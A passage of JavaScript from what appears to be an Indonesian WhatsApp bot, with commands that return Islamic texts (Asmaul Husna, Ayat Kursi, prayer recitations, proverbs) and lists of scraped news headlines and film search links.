translation_en: "The Patron"
},
{
index: 78,
latin: "Al Muta’aalii",
arabic: "الْمُتَعَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Self Exalted"
},
{
index: 79,
latin: "Al Barri",
arabic: "الْبَرُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
translation_en: "The Most Kind and Righteous"
},
{
index: 80,
latin: "At Tawwaab",
arabic: "التَّوَابُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
translation_en: "The Ever Returning, Ever Relenting"
},
{
index: 81,
latin: "Al Muntaqim",
arabic: "الْمُنْتَقِمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
translation_en: "The Avenger"
},
{
index: 82,
latin: "Al Afuww",
arabic: "العَفُوُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
translation_en: "The Pardoner, the Effacer of Sins"
},
{
index: 83,
latin: "Ar Ra`uuf",
arabic: "الرَّؤُوفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
translation_en: "The Compassionate, the All Pitying"
},
{
index: 84,
latin: "Malikul Mulk",
arabic: "مَالِكُ الْمُلْكِ",
translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
translation_en: "The Owner of All Sovereignty"
},
{
index: 85,
latin: "Dzul JalaaliWal Ikraam",
arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
translation_en: "The Lord of Majesty and Generosity"
},
{
index: 86,
latin: "Al Muqsith",
arabic: "الْمُقْسِطُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Equitable, the Requiter"
},
{
index: 87,
latin: "Al Jamii’",
arabic: "الْجَامِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
translation_en: "The Gatherer, the Unifier"
},
{
index: 88,
latin: "Al Ghaniyy",
arabic: "الْغَنِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
translation_en: "The All Rich, the Independent"
},
{
index: 89,
latin: "Al Mughnii",
arabic: "الْمُغْنِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
translation_en: "The Enricher, the Emancipator"
},
{
index: 90,
latin: "Al Maani",
arabic: "اَلْمَانِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
translation_en: "The Withholder, the Shielder, the Defender"
},
{
index: 91,
latin: "Ad Dhaar",
arabic: "الضَّارَّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
translation_en: "The Distressor, the Harmer"
},
{
index: 92,
latin: "An Nafii’",
arabic: "النَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
translation_en: "The Propitious, the Benefactor"
},
{
index: 93,
latin: "An Nuur",
arabic: "النُّورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
translation_en: "The Light"
},
{
index: 94,
latin: "Al Haadii",
arabic: "الْهَادِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
translation_en: "The Guide"
},
{
index: 95,
latin: "Al Baadii",
arabic: "الْبَدِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
translation_en: "Incomparable, the Originator"
},
{
index: 96,
latin: "Al Baaqii",
arabic: "اَلْبَاقِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
translation_en: "The Ever Enduring and Immutable"
},
{
index: 97,
latin: "Al Waarits",
arabic: "الْوَارِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
translation_en: "The Heir, the Inheritor of All"
},
{
index: 98,
latin: "Ar Rasyiid",
arabic: "الرَّشِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
translation_en: "The Guide, Infallible Teacher, and Knower"
},
{
index: 99,
latin: "As Shabuur",
arabic: "الصَّبُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
translation_en: "The Patient"
}
]
let json = JSON.parse(JSON.stringify(asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (isNaN(args[0])) return reply(`contoh:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return m.reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
}
m.reply(`${contoh} + ${data} + ${anjuran}`)
}
break

case 'ayatkursi': {
let caption = `
*${m2}「 Ayat Kursi 」${m2}*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
m.reply(caption)
}
break

case 'bacaansholat': {
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keselamatan, rohmat dan berkah ALLAH selalu tercurah untuk kamu sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*Artinya:*\n_"${v.terjemahan}"_`).join('\n\n')
let contoh = `*${m2}「 Bacaan Shalat 」${m2}*\n\n`
m.reply(`${contoh} + ${data}`)
}
break

case 'doaharian': {
let src = JSON.parse(fs.readFileSync('./lib/doaharian.json', 'utf-8'))
let caption = src.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Latin :
${v.latin}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)
}
break

case 'niatsholat': {
if (!q) return reply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 2,
solat: "maghrib",
latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 3,
solat: "dzuhur",
latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 4,
solat: "isha",
latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 5,
solat: "ashar",
latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
}
]
let text = q.toLowerCase() || ''
let data = Object.values(niatsholat).find(v => v.solat == text)
if (!data) return m.reply(`*${m2}( ${txt} Tidak Ditemukan )${m2}*\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
m.reply(`
*${m2}Niat Sholat ${text}${m2}*

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}
break

case 'quotesislami': {
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (kesuksesan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": 6,
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "Tidak ada kenikmatan kecuali setelah kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "Keselamatan manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
 "id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
 "arti": "Berlaku lemah lembut kepada orang yang lemah itu termasuk akhlak orang yang mulia (terhormat)."
},
{
 "id": "23",
 "arabic": "وَعَامِلِ النَّاسَ بِمَا تُحِبُّ مِنْهُ دَائِماً",
 "arti": "Dan bergaullah dengan manusia dengan sikap yang kamu juga suka diperlakukan seperti itu."
},
{
 "id": "24",
 "arabic": "لَيْسَ الجَمَالُ بِأَثْوَابٍ تُزَيِّنُنُا إِنَّ الجَمَالَ جمَاَلُ العِلْمِ وَالأَدَبِ",
 "arti": "Kecantikan bukanlah dengan pakaian yang melekat menghiasi diri kita, sesungguhnya kecantikan ialah kecantikan dengan ilmu dan budi pekerti."
},
{
 "id": "25",
 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
m.reply(`${arabic}\n${arti}`)
}
break

case 'doatahlil': {
let { result } = JSON.parse(fs.readFileSync('./database/tahlil.json', 'utf-8'))
let caption = result.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)
}
break

//=================================//



 case 'fajar':


FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
break
//=================================================//
case 'cnn':


CNNNews().then(res => {
no = 0
iwann = ""
for (let i of res) {
no += 1
iwann += `\n• ${no.toString()} •\n`
iwann += `Berita: ${i.berita}\n`
iwann += `Link: ${i.berita_url}\n`
}
iwann += ""
reply(iwann) 
})
break
//=================================================//
case 'layarkaca':


if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
break
//=================================================//
case 'cnbc':


CNBCNews().then(async(res) => {
no = 0
iwannnn = ""
for (let i of res) {
no += 1
iwannnn += `\n• ${no.toString()} •\n`
iwannnn += `Berita: ${i.berita}\n`
iwannnn += `Upload: ${i.berita_diupload}\n`
iwannnn += `Link: ${i.berita_url}\n`
}
iwannnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnn }, { quoted:m })
})
break
//=================================================//
case 'tribun':


TribunNews().then(async(res) => {
no = 0
iwannnnn = ""
for (let i of res) {
no += 1
iwannnnn += `\n• ${no.toString()} •\n`
iwannnnn += `Berita: ${i.berita}\n`
iwannnnn += `Upload: ${i.berita_diupload}\n`
iwannnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnn += `Link: ${i.berita_url}\n`
}
iwannnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnn }, { quoted:m })
})
break
//=================================================//
case 'indozone':


IndozoneNews().then(async(res) => {
no = 0
iwannnnnn = ""
for (let i of res) {
no += 1
iwannnnnn += `\n• ${no.toString()} •\n`
iwannnnnn += `Berita: ${i.berita}\n`
iwannnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnn }, { quoted:m })
})
break
//=================================================//
case 'kompas':


KompasNews().then(async(res) => {
no = 0
iwannnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnn += `Berita: ${i.berita}\n`
iwannnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnn }, { quoted:m })
})
break
//=================================================//
case 'detiknews':


DetikNews().then(async(res) => {
no = 0
iwannnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'dailynews':


DailyNews().then(async(res) => {
no = 0
iwannnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnn += ""
ptz.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnn }, { quoted:m })
})
break
//=================================================//
case 'inews':


iNews().then(async(res) => {
no = 0
iwannnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnn += ""
reply(iwannnnnnnnnn) 
})
break
//=================================================//
case 'okezone':


OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
